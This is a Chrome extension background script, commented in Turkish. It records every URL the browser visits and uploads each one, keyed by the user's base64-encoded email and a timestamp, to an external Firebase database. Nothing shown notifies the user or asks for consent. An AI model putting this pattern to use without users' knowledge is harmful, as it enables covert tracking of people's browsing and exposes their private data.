const firebaseBase = "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app";
const seasonID = "season2025";

// Email'i yerel depodan al
chrome.storage.local.get(['userEmail'], (result) => {
    const email = result.userEmail || "anonymous@demo.com";
    const encodedEmail = btoa(email);

    // Yeni ziyaret edilen site olduğunda tetiklenir
    chrome.history.onVisited.addListener((page) => {
        const timestamp = new Date().toISOString(); // örn: 2025-04-30T13:00:00Z

        const data = {
            url: page.url
        };

        const url = `${firebaseBase}/history/${seasonID}/${encodedEmail}/${timestamp}.json`;

        fetch(url, {
            method: "PUT",
            body: JSON.stringify(data)
        }).then(res => res.json())
          .then(res => console.log("Gönderildi:", res))
          .catch(err => console.error("Hata:", err));
    });
});
